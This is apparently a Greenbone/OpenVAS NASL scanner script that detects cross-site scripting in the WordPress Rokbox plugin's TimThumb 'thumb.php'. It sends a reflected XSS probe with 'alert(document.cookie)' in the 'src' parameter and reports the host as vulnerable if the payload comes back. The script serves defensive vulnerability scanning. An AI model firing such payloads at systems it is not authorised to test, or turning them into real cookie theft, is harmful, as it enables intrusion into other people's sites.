CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.803079" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2012-12-18 14:38:17 +0530 (Tue, 18 Dec 2012)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "WordPress Rokbox Plugin Multiple Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "wordpress/installed" );
	script_xref( name: "URL", value: "http://websecurity.com.ua/6006/" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/118884/wprokbox-shellspoofdosxss.txt" );
	script_tag( name: "impact", value: "Successful exploitation could allow attackers to execute arbitrary HTML and
  script code in a user's browser session in context of an affected site and
  to gain sensitive information like installation path location." );
	script_tag( name: "affected", value: "WordPress Rokbox Plugin versions using TimThumb 1.16 and JW Player 4.4.198" );
	script_tag( name: "insight", value: "Flaws are due to an improper validation of user supplied inputs to the
  'src' parameter in 'thumb.php' and 'aboutlink', 'file' and 'config' parameters in 'jwplayer.swf'." );
	script_tag( name: "solution", value: "Update to the WordPress Rokbox Plugin version 2.1.3." );
	script_tag( name: "summary", value: "This host is installed with WordPress Rokbox Plugin and is prone to multiple
  vulnerabilities." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "http://www.rockettheme.com/wordpress-downloads/plugins/free/2625-rokbox" );
	exit( 0 );
}
require("http_func.inc.sc");
require("host_details.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/wp-content/plugins/wp_rokbox/thumb.php?src=<body onload=alert(document.cookie)>.jpg";
if(http_vuln_check( port: port, url: url, check_header: TRUE, pattern: "alert\\(document\\.cookie\\)", extra_check: "imThumb version" )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

